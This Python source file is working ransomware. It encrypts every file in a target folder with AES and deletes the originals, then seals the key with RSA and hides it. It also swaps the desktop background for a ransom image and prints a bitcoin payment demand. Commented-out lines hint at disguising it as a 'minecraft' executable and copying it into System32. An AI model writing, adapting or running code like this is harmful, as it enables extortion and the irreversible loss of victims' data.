from Crypto.Cipher import AES, PKCS1_OAEP
from tools import AES_KF_E, change_background, get_venv_var, all_files, delete_file, hide_file, reveal_file, run_as_admin
from tools import read_bytes, write_bytes, ABS_ROUTE_TARGET_FOLDER, AES_KF, PUB_KF
from mykeys import bytes_to_RSA_key, get_AES_random_key
from os.path import isfile
from os import name


def encrypt_file_aes(file_name: str, aes_key: bytes) -> None:
    file_data = read_bytes(file_name)

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


def encrypt_RSA(data: bytes, pub_key) -> bytes:
    cipher = PKCS1_OAEP.new(pub_key)
    return cipher.encrypt(data)


if __name__ == '__main__':

    TARGET = get_venv_var('TARGET')
    if TARGET == None:
        TARGET = ABS_ROUTE_TARGET_FOLDER

    #print('target:', TARGET)

    target_files = all_files(TARGET)

    assert isfile(PUB_KF), 'No PublicRSA key, can\'t encrypt.'

    aes_key = get_AES_random_key()
    for file in target_files:
        encrypt_file_aes(file, aes_key)
        delete_file(file)

    pub_key = bytes_to_RSA_key(read_bytes(PUB_KF))
    aes_key_enc = encrypt_RSA(aes_key, pub_key)
    write_bytes(aes_key_enc, AES_KF_E)

    hide_file(AES_KF_E)

    change_background('.ransom.png')

    if name == 'posix':
        reveal_file('.rescue')
        #delete_file('minecraft')     # deleting the executable file
    if name == 'nt':
        reveal_file('.rescue.exe')
        #delete_file('minecraft.exe')     # deleting the executable file
        #run_as_admin()
        #exe_bytes = read_bytes('minecraft.exe')
        #write_bytes(exe_bytes, 'C:\\Windows\\System32\\minecraft.exe')


    print('Your files in the Documents folder have been encrypted')
    print('to recover them send 10 USD worth of bitcoin to this address:')
    print('\tmnw7zmS1jFVy2n55NM14r7jVreYtfbedCd')
